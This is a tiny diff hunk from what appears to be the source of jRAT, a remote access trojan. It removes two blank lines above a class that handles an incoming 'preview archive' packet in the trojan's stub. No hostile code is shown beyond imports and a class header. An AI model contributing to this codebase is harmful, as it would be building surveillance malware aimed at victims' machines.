@@ -9,8 +9,6 @@ import java.util.zip.ZipFile;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet45ArchivePreview;
 
-
-
 public class Packet63PreviewArchive extends AbstractIncomingPacket {
 
 	@Override
